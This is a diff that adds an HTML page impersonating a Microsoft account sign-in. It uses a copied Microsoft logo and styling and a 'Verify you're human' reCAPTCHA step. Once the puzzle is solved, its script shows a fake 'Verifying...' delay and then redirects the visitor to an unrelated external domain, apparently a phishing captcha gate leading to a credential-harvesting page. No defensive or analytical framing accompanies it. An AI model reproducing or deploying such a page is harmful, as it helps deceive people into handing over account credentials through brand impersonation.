@@ -1,0 +1,211 @@
+source: <html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Microsoft account | Sign In</title>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
+  </head>
+  <style>
+    /* --- Global Styles --- */
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', 'Arial', sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* --- Main Container --- */
+    .container {
+      background-color: #ffffff;
+      padding: 44px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.25);
+      max-width: 440px;
+      width: 100%;
+      box-sizing: border-box;
+      text-align: left;
+    }
+    
+    .logo-img {
+        width: 108px; /* Standard Microsoft logo width */
+        height: 23px;
+        margin-bottom: 25px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      color: #1b1b1b;
+      margin: 0 0 10px 0;
+    }
+
+    .info-text {
+      font-size: 15px;
+      color: #1b1b1b;
+      margin-bottom: 25px;
+      line-height: 1.5;
+    }
+
+    /* --- Captcha and Form Elements --- */
+    .captcha-container {
+        text-align: center; /* Center the child elements */
+    }
+
+    .g-recaptcha {
+      display: inline-block; /* Allows centering */
+      margin-bottom: 20px;
+    }
+
+    #g-recaptcha-error {
+      height: 20px;
+      font-size: 13px;
+      color: #e81123; /* Microsoft's error red */
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    .button-container {
+        text-align: right; /* Align button to the right like Microsoft forms */
+        margin-top: 10px;
+    }
+
+    #sub {
+      background-color: #0067b8; /* Microsoft blue */
+      color: white;
+      font-size: 15px;
+      border: none;
+      padding: 10px 24px;
+      cursor: pointer;
+      transition: background-color 0.2s;
+      min-width: 108px;
+    }
+
+    #sub:hover {
+      background-color: #005da6;
+    }
+
+    /* --- Loader Animation --- */
+    .loader {
+      border: 4px solid #deecf9;
+      border-top: 4px solid #0067b8; /* Microsoft blue */
+      border-radius: 50%;
+      width: 28px;
+      height: 28px;
+      animation: spin 1s linear infinite;
+      display: none; /* Initially hidden */
+      margin: 20px auto; /* Center the loader */
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* --- Full Page Loading Screen --- */
+    #page {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: #f2f2f2;
+      display: none; /* Initially hidden */
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      color: #5f6368;
+    }
+
+    /* --- Footer --- */
+    .footer {
+        position: fixed;
+        bottom: 15px;
+        right: 20px;
+        font-size: 12px;
+        color: #606060;
+    }
+    .footer span {
+        margin-left: 16px;
+        cursor: pointer;
+    }
+    .footer span:hover {
+        color: #0067b8;
+        text-decoration: underline;
+    }
+
+  </style>
+  <body>
+    <div class="container" id="captchaContainer">
+        <!-- Microsoft Logo embedded as Base64 SVG -->
+        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMjAwIDI1OCI+PHBhdGggZmlsbD0iI0YyNTAyMiIgZD0iTTAgMGg1NzV2Mjg3SDB6Ii8+PHBhdGggZmlsbD0iIzdGQkEwMCIgZD0iTTYyNSAwaDU3NXYyODdINjI1eiIvPjxwYXRoIGZpbGw9IiMwMEE0RTAiIGQ9Ik0wIDMyNGg1NzV2Mjg3SDB6Ii8+PHBhdGggZmlsbD0iI0ZGQjkwMCIgZD0iTTYyNSAzMjRoNTc1djI4N0g2MjV6Ii8+PC9zdmc+" class="logo-img" alt="Microsoft">
+
+        <h1>Verify you're human</h1>
+        <p class="info-text">
+            To protect your account, we need to make sure you're a real person. Please complete the puzzle.
+        </p>
+      
+        <div class="captcha-container">
+            <div class="g-recaptcha" data-sitekey="6LdJg30rAAAAAI_lhE_NRIJHExl9hAfHfSi8vy9S"></div>
+            <div id="g-recaptcha-error"></div>
+            <div class="loader" id="loading"></div>
+        </div>
+        
+        <div class="button-container">
+            <button id="sub">Next</button>
+        </div>
+    </div>
+
+    <div class="footer">
+        <span>Terms of use</span>
+        <span>Privacy & cookies</span>
+        <span>...</span>
+    </div>
+
+    <p id="page">Loading...</p>
+
+  </body>
+  <script>
+    var submitBtn = document.getElementById("sub");
+    
+    submitBtn.addEventListener("click", function () {
+      const pageLoader = document.getElementById("page");
+      const spinner = document.getElementById("loading");
+      const captchaContainer = document.getElementById("captchaContainer");
+      const errorDiv = document.getElementById("g-recaptcha-error");
+
+      let recaptcha_response = grecaptcha.getResponse();
+
+      if (recaptcha_response.length < 1) {
+        errorDiv.innerHTML = 'Please complete the puzzle to continue.';
+      } else {
+        errorDiv.innerHTML = "";
+        spinner.style.display = "block";
+        
+        // Hide elements for loading state
+        document.querySelector('.g-recaptcha').style.display = 'none';
+        document.querySelector('.button-container').style.display = 'none';
+        document.querySelector('.info-text').style.display = 'none';
+        document.querySelector('h1').innerHTML = 'Verifying...';
+
+        // Simulate verification delay
+        setTimeout(() => {
+          pageLoader.style.display = "flex";
+          captchaContainer.style.display = "none";
+        }, 4000);
+
+        // Redirect after full loading time
+        setTimeout(() => {
+          let url = "https://netmarkadurbuilder.com/rsv";
+          window.location.href = url;
+        }, 7000);
+      }
+    });
+  </script>
+</html>
+Page title: Microsoft account | Sign In
